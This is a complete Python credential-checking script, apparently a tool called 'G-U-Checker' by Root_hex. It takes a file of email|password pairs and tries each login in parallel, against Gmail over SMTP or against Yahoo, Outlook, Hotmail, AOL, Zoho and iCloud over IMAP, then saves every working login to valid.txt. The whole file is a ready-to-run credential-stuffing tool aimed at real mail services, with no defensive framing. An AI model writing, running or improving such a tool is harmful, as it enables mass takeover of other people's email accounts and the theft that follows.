import smtplib
import imaplib
import concurrent.futures
import os
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

logo = f"""{Fore.CYAN}
   ____       _   _        ____ _               _             
  / ___|     | | | |      / ___| |__   ___  ___| | _____ _ __ 
 | |  _ _____| | | |_____| |   | '_ \ / _ \/ __| |/ / _ \ '__|
 | |_| |_____| |_| |_____| |___| | | |  __/ (__|   <  __/ |   
  \____|      \___/       \____|_| |_|\___|\___|_|\_\___|_|   
                                                              
{Style.RESET_ALL}       {Fore.GREEN}developer by Root_hex - Mail Checker{Style.RESET_ALL}
"""

print(logo)

print(f"{Fore.CYAN}[1] Check Gmail account{Style.RESET_ALL}")
print(f"{Fore.CYAN}[2] Check Non-Gmail accounts (Yahoo, Outlook, dll.){Style.RESET_ALL}")
mode = input(f"{Fore.CYAN}[?] Select Mode (1/2): {Style.RESET_ALL}")

file_path = input(f"{Fore.CYAN}[?] Enter the name of the account list file(.txt): {Style.RESET_ALL}")

if not os.path.exists(file_path):
    print(f"{Fore.RED}[!] File not found: {file_path}{Style.RESET_ALL}")
    exit()

with open(file_path, "r", encoding="utf-8") as f:
    lines = [line.strip() for line in f.readlines() if line.strip()]

valid_accounts = []

def check_gmail(line):
    try:
        if "|" not in line:
            print(f"{Fore.RED}[SKIPPED] Incorrect format: {line}{Style.RESET_ALL}")
            return

        email, password = line.split("|")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.quit()
        
        print(f"{Fore.GREEN}[VALID] {email}|{password}{Style.RESET_ALL}")
        valid_accounts.append(f"{email}|{password}")
    except Exception:
        print(f"{Fore.RED}[INVALID] {email}|{password}{Style.RESET_ALL}")

def check_non_gmail(line):
    try:
        if "|" not in line:
            print(f"{Fore.RED}[SKIPPED] Incorrect format: {line}{Style.RESET_ALL}")
            return

        email, password = line.split("|")
        domain = email.split("@")[-1]

        imap_servers = {
            "yahoo.com": "imap.mail.yahoo.com",
            "outlook.com": "imap-mail.outlook.com",
            "hotmail.com": "imap-mail.outlook.com",
            "aol.com": "imap.aol.com",
            "zoho.com": "imap.zoho.com",
            "icloud.com": "imap.mail.me.com"
        }

        if domain not in imap_servers:
            print(f"{Fore.RED}[SKIPPED] Not supported: {email}{Style.RESET_ALL}")
            return

        imap_server = imap_servers[domain]

        mail = imaplib.IMAP4_SSL(imap_server)
        mail.login(email, password)
        mail.logout()

        print(f"{Fore.GREEN}[VALID] {email}|{password}{Style.RESET_ALL}")
        valid_accounts.append(f"{email}|{password}")
    except Exception:
        print(f"{Fore.RED}[INVALID] {email}|{password}{Style.RESET_ALL}")

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    if mode == "1":
        executor.map(check_gmail, lines)
    elif mode == "2":
        executor.map(check_non_gmail, lines)
    else:
        print(f"{Fore.RED}[!] Invalid mode!{Style.RESET_ALL}")
        exit()

if valid_accounts:
    with open("valid.txt", "w", encoding="utf-8") as f:
        f.write("\n".join(valid_accounts) + "\n")

print(f"\n{Fore.GREEN}✅ Inspection complete!{Style.RESET_ALL}")
print(f"{Fore.CYAN}✔ Valid results are stored in: valid.txt{Style.RESET_ALL}")
